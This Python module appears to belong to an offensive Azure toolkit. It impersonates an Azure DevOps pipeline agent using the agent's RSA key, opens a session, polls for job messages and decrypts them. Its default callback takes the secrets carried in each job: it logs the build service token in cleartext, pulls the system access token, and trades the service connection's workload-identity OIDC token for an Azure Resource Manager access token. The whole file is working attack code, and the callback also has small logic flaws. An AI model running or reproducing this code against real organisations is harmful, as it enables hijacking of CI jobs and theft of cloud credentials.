"""A module containing azure devops agent http client"""
import logging
from azol.constants import  OAuthResourceIDs
import time
import base64
import json
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, padding as pad
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import requests
from pprint import pprint

def _default_message_callback(decrypted_message):
    '''
    Default callback when polling for devops messages. Collects job data and fetches
    workload identity tokens. Any tokens that are fetched are added to an "azol_custom_results"
    object in the returned dictionary.

    Returns: a dictionary with the decrypted message, and any tokens that were identified
    '''
    timeline = decrypted_message["timeline"]["id"]
    planId = decrypted_message["plan"]["planId"]
    jobId = decrypted_message["jobId"]
    resources = decrypted_message["resources"]
    projectId = decrypted_message["variables"]["system.teamProjectId"]["value"]
    oidc_endpoint=decrypted_message["variables"]["System.OidcRequestUri"]["value"]
    system_access_token = decrypted_message["variables"]["system.accessToken"]["value"]
    system_uri = decrypted_message["variables"]["system.taskDefinitionsUri"]["value"]
    headers = {
        "Authorization": f"Bearer {system_access_token}",
        "Accept": "application/json; api-version=7.2-preview.1",
        "Content-Type": "application/json; api-version=7.2-preview.1"
    }
    body = {
        "value": [
            {
                "id": jobId,
                "type": "Job",
                "name": "Job",
                "state": "inProgress"
            }
        ],
        "count": 1
    }

    r = requests.patch(f"{system_uri}{projectId}/_apis/distributedtask/hubs/Build/"
                        f"plans/{planId}/timelines/{timeline}/records", json=body, headers=headers)
    
    endpoints = resources["endpoints"]
    azol_annotations = {}
    azol_annotations["endpoints"] = {}
    for endpoint in endpoints:
        azol_annotations["endpoints"]["name"] = { "tokens": {} }
        if endpoint["name"] == "SystemVssConnection":
            devops_org = endpoint["data"]["ServerName"]
            access_token=endpoint["authorization"]["parameters"]["AccessToken"]
            logging.info(f"Found devOps build service access token for {devops_org}: \n{access_token}\n\n ")
            azol_annotations["endpoints"]["name"]["tokens"]["buildService"] = access_token
        elif endpoint["type"] == "azurerm":
            azol_annotations["endpoints"]["type"]="azurerm"
            
            subscription_id = endpoint["data"]["subscriptionId"]
            identity_type = endpoint["data"]["identityType"]
            sc_id = endpoint["id"]
            sc_name = endpoint["name"]
            sc_created_by = endpoint["createdBy"]["uniqueName"]
            sc_created_by_id = endpoint["createdBy"]["id"]
            tenant_id = endpoint["authorization"]["parameters"]["tenantid"]
            auth_scheme = endpoint["authorization"]["scheme"]
            if auth_scheme == "WorkloadIdentityFederation":
                subject = endpoint["authorization"]["parameters"]["workloadIdentityFederationSubject"]
                issuer = endpoint["authorization"]["parameters"]["workloadIdentityFederationIssuer"]
                sp_id = endpoint["authorization"]["parameters"]["serviceprincipalid"]
                description = endpoint["description"]
                logging.info(f"Found service connection {sc_name}:{sc_id} with access to tenant {tenant_id} created by {sc_created_by}:{sc_created_by_id}.")
                logging.info(f"Service connection is a service principal set up with workload federation, subject {subject}, issuer {issuer}.")
                logging.info(f"Service Connection's service principal ID: {sp_id}")
                
            query_params = {
                "serviceConnectionId": sc_id
            }
            logging.info("Fetching OIDC tokens...")
            headers = {
                "Authorization": f"Bearer {system_access_token}",
                "Accept": "application/json; api-version=7.2-preview.1",
                "Content-Type": "application/json; api-version=7.2-preview.1"
            }
            r=requests.post(oidc_endpoint, headers=headers, params=query_params)
            azol_annotations["endpoints"]["name"]["tokens"]["workloadIdentityFederationOidcToken"] = r.json()["oidcToken"]
            logging.info("Fetching Access Tokens from ARM...")
            authorization_server_url=f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            body = {
                "scope": "https://management.azure.com/.default",
                "client_id": sp_id,
                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                "client_assertion": r.json()["oidcToken"],
                "grant_type": "client_credentials"
            }
            r=requests.post(authorization_server_url, headers=headers, data=body)
            token = r.json()["access_token"]
            azol_annotations["endpoints"]["name"]["tokens"]["arm_token"] = token
            decrypted_message["azol_annotations"] = azol_annotations
            return decrypted_message

class DevOpsAgentInvalidClientException(Exception):
    """An exception when a devops agent client id was incorrect"""
    def __init__(self, *args, **kwargs):
        default_message = "The client id used for the agent is invalid"
        if not args: args = (default_message,)
        super().__init__(*args, **kwargs)

class DevOpsAgentAuthenticationException(Exception):
    """An exception when a devops agent cannot authenticate"""
    def __init__(self, *args, **kwargs):
        default_message = "Could not authenticate to Azure DevOps using the supplied credentials"
        if not args: args = (default_message,)
        super().__init__(*args, **kwargs)

class DevOpsAgentSessionExistsAzolException(Exception):
    """An exception when a devops agent session already exists for an agent"""
    def __init__(self, *args, **kwargs):
        default_message = "A session for the agent already exists"
        if not args: args = (default_message,)
        super().__init__(*args, **kwargs)

class DevOpsAgentSessionCreationException(Exception):
    """An exception when an error arises while creating a devops session"""
    def __init__(self, *args, **kwargs):
        default_message = 'Could not create a devops session'
        if not args: args = (default_message,)

        super().__init__(*args, **kwargs)

class AzureDevOpsAgentClient( object ):
    """
        An HTTP client for spoofing a devOps Agent
    """

    def __init__( self, agent_credentials, devops_org_name, agent_id,
                  pool_id, agent_client_id, *args, **kwargs ):
        
        # If no arguments are supplied, assume the code is running on a devops agent.
        self.devops_org_name = devops_org_name
        self.agent_id = agent_id
        self.pool_id = pool_id
        self.agent_client_id = agent_client_id
        self._agent_credentials = agent_credentials
        self._current_token=None
        self.encryption_key = None
        self.session_id = None

        public_numbers = RSAPublicNumbers( self._agent_credentials.rsa_parameters.exponent, self._agent_credentials.rsa_parameters.modulus )
        private_numbers = RSAPrivateNumbers( self._agent_credentials.rsa_parameters.p, self._agent_credentials.rsa_parameters.q,
                                           self._agent_credentials.rsa_parameters.d, self._agent_credentials.rsa_parameters.dp,
                                           self._agent_credentials.rsa_parameters.dq, self._agent_credentials.rsa_parameters.inverseq,
                                           public_numbers )
        
        self._agent_private_key = private_numbers.private_key(backend=default_backend())

    def fetch_token(self):
        assertion = self._generate_assertion()
        body={
            "grant_type": "client_credentials",
            "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
            "client_assertion": assertion
        }
        
        headers = {
            "Accept": "application/json"
        }

        resp=requests.post(f"https://vssps.dev.azure.com/{self.devops_org_name}/_apis/oauth2/token",
                            headers=headers, data=body)
        resp_data = resp.json()
        if "access_token" not in resp_data.keys():
            if "error" in resp_data.keys():
                if resp_data["error"] == "invalid_client":
                    raise DevOpsAgentInvalidClientException
                raise DevOpsAgentAuthenticationException
            if "typeKey" in resp_data.keys():
                if resp_data["typeKey"] == "RegistrationNotFoundException":
                    raise DevOpsAgentInvalidClientException
            raise DevOpsAgentAuthenticationException
        token=resp.json()["access_token"]
        self._current_token=token
        return token

    def _generate_assertion(self, expiry=300):
        epoch_time = int(time.time())
        expiry_time = epoch_time + expiry
        token_headers={
            "typ": "JWT",
            "alg": "RS256"
        }
        token_body={
            "sub": self.agent_client_id,
            "jti": self.agent_client_id,
            "iss": self.agent_client_id,
            "aud": f"https://vssps.dev.azure.com/{self.devops_org_name}/_apis/oauth2/token",
            "nbf": epoch_time,
            "exp": expiry_time
        }
        header_b64 = base64.urlsafe_b64encode(json.dumps(token_headers).encode()).decode().rstrip("=")
        body_b64 = base64.urlsafe_b64encode(json.dumps(token_body).encode()).decode().rstrip("=")
        b64_header_body = header_b64 + "." + body_b64

        signature = base64.urlsafe_b64encode(
            self._agent_private_key.sign(
                b64_header_body.encode(), padding=padding.PKCS1v15(),
                algorithm=hashes.SHA256()
            )
        ).decode().rstrip("=")

        assertion  = b64_header_body + "." + signature
        return assertion
    


    def kill_session(self, session_id=None):
        '''
            Kill an existing session for this agent

            If session_id is not specified, this function will try to kill the session it has created
            using the "create_session" command

            Args:
                session_id - the session id that should be deleted
            
            Returns:
                None
        '''
        if session_id == None:
            session_id = self.session_id
        if session_id == None:
            raise Exception("No session id provided, and no session ID cached by the client")
        self.fetch_token()
        headers = {
            "Authorization": f"Bearer {self._current_token}",
            "Accept": "application/json; api-version=7.2-preview.1",
            "Content-Type": "application/json; api-version=7.2-preview.1"
        }
        resp=requests.delete(f"https://dev.azure.com/{self.devops_org_name}"
                             f"/_apis/distributedtask/pools/{self.pool_id}"
                             f"/sessions/{session_id}", headers=headers)
        if resp.status_code == 200:
            self.session_id=None

        logging.info(f"Session {session_id} ended ")
    
    def create_session(self):
        self.fetch_token()
        headers = {
            "Authorization": f"Bearer {self._current_token}",
            "Accept": "application/json; api-version=7.2-preview.1",
            "Content-Type": "application/json; api-version=7.2-preview.1"
        }
        body={
            "ownerName": "testing",
            "agent": {
                "id": self.agent_id,
                "version": "4.251.0"
            }
        }
        
        resp=requests.post(f"https://dev.azure.com/{self.devops_org_name}"
                           f"/_apis/distributedtask/pools/{self.pool_id}/sessions",
                           headers=headers, json=body)
        if resp.status_code == 409:
            logging.warning("Could not create session - Session already exists.")
            raise DevOpsAgentSessionExistsAzolException()

        contents=resp.json()

        b64_encrypted_encryption_key = contents["encryptionKey"]
        self.session_id = contents["sessionId"]
        
        encrypted_b64_aes_key=b64_encrypted_encryption_key["value"]
        encrypted_bytes_aes_key=base64.b64decode(encrypted_b64_aes_key)
        
        aes_key=self._agent_private_key.decrypt(encrypted_bytes_aes_key,
                                    padding=padding.OAEP(mgf=padding.MGF1(hashes.SHA1()),
                                                   algorithm=hashes.SHA1(), label=None))
        self._session_key = algorithms.AES(aes_key)
        logging.info(f"Session Created with ID {self.session_id}")

    def poll(self, message_callback=None, max_messages=1, max_time=None):
        '''
            Poll the devOps pool for new messages.

            When a new message is received, it is decrypted and the message contents are
            used as a parameter to the message_callback.

            If no message_callback is set, the message contents will be printed to stdout

            Args:
                message_callback - (function) A callback that can be used to process each message.
                max_messages - (int) the maximum number of messages to receive before endoing the
                                     polling loop. defaults to 1
                max_time - (int) The maximum amount of time in seconds to poll for new messages.
                                 if None, poll forever. defaults to None                                 

            Returns:
                A python generator, which yields the results of the message callback

        '''

        if not message_callback:
            message_callback = _default_message_callback

        number_messages_received = 0
        epoch_time = int(time.time())
        time_limit=False
        poll_expiry = None
        if max_time:
            time_limit=True
            poll_expiry = epoch_time + max_time
        
        while True:
            if number_messages_received >= max_messages:
                break
            # devops agent requests are not asynchronous, and may block for 60 seconds or so.
            if time_limit and int(time.time()) >= poll_expiry-60:
                break

            # listen to new jobs and print the job contents
            self.fetch_token()
            logging.info("Polling for messages...")
            headers = {
                "Authorization": f"Bearer {self._current_token}",
                "Accept": "application/json; api-version=7.2-preview.1",
                "Content-Type": "application/json; api-version=7.2-preview.1"
            }
            try:
                resp=requests.get(f"https://dev.azure.com/{self.devops_org_name}"
                              f"/_apis/distributedtask/pools/{self.pool_id}"
                              f"/messages?sessionId={self.session_id}", headers=headers,
                              timeout=60)
                if resp.status_code != 200:

                    logging.error(resp.status_code)
                    logging.error(resp.content)
                    raise DevOpsAgentSessionCreationException()
                logging.info("Got message. Deserializing to json...")
                message_json = resp.json()

                logging.info("Trying to decrypt...")
                iv_b64 = message_json["iv"]
                iv=base64.b64decode(iv_b64)
                encrypted_b64_message=message_json["body"]
                encrypted_bytes=base64.b64decode(encrypted_b64_message)

                cipher = Cipher(self._session_key, modes.CBC(iv))
                decryptor=cipher.decryptor()
                plaintext=decryptor.update(encrypted_bytes) + decryptor.finalize()
                
                block_size=128
                unpadder = pad.PKCS7(block_size).unpadder()

                plaintext = unpadder.update(plaintext) + unpadder.finalize()
                decrypted_message=json.loads(plaintext)
                logging.info("Sending message to callback...")
                yield message_callback(decrypted_message)
                number_messages_received += 1

            except requests.exceptions.Timeout:
                logging.info("No new messages.")
